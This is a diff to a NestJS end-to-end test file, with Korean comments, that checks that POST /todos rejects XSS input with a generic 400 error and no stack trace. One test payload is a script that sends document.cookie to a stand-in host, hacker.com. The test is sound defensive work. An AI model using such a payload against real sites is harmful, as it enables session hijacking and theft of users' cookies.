@@ -39,7 +39,7 @@ describe('POST /todos — 인증', () => {
   });
 });
 
-describe('POST /todos — 유효성 검사', () => {
+describe('POST /todos — 유효성 및 XSS 방어 검증', () => {
   let app: INestApplication<App>;
   let authCookie: string;
 
@@ -66,7 +66,6 @@ describe('POST /todos — 유효성 검사', () => {
   });
 
   it('제목에 XSS 페이로드 주입했는데 다털렸죠? ㅋㅋㅋㅋ', async () => {
-    // 해커가 세션을 탈취하기 위해 흔히 주입하는 악성 스크립트 페이로드
     const xssPayload =
       '<script>fetch("http://hacker.com/steal?cookie=" + document.cookie)</script>';
 
@@ -78,15 +77,27 @@ describe('POST /todos — 유효성 검사', () => {
         description: '대학생한테 다 털렸죠?',
       });
 
-    // 1. 서버가 아예 400 Bad Request로 진입 금지를 하거나,
-    // 2. 만약 201 Created로 저장을 허용하더라도 응답 값에는 날것의 <script> 태그가 그대로 남아있으면 안 됨 (이스케이프 및 정제 검증)
-    if (res.status === 201) {
-      expect(res.body.title).not.toContain('<script>');
-      // 보통 &lt;script&gt; 형태로 안전하게 치환(Escape)되었는지 확인
-      expect(res.body.title).toContain('&lt;script&gt;');
-    } else {
-      expect(res.status).toBe(400);
-    }
+    // 🛡️ [마스킹 검증] 외부로는 상세 내역을 감추고 공통 에러 포맷으로 차단 성공했는지 체크
+    expect(res.status).toBe(400);
+    expect(res.body.message).toBe('Validation failed');
+    expect(res.body).not.toHaveProperty('stack');
+  });
+
+  it('설명(description)에 XSS 페이로드를 주입해도 똑같이 400으로 차단되어야 한다', async () => {
+    const xssPayload = '<script>alert("뒷문 공략 실패")</script>';
+
+    const res = await request(app.getHttpServer())
+      .post('/todos')
+      .set('Cookie', authCookie)
+      .send({
+        title: '정상적인 제목',
+        description: xssPayload,
+      });
+
+    // 🛡️ 설명 필드 역시 정보 노출 취약점 없이 공통 포맷으로 완벽 방어 체크
+    expect(res.status).toBe(400);
+    expect(res.body.message).toBe('Validation failed');
+    expect(res.body).not.toHaveProperty('stack');
   });
 
   it('잘못된 payload면 400을 반환한다', async () => {
@@ -96,7 +107,7 @@ describe('POST /todos — 유효성 검사', () => {
       .send({ title: '', description: 'test' });
 
     expect(res.status).toBe(400);
-    expect(res.body).toHaveProperty('message');
+    expect(res.body.message).toBe('Validation failed');
     expect(res.body).not.toHaveProperty('stack');
   });
 });
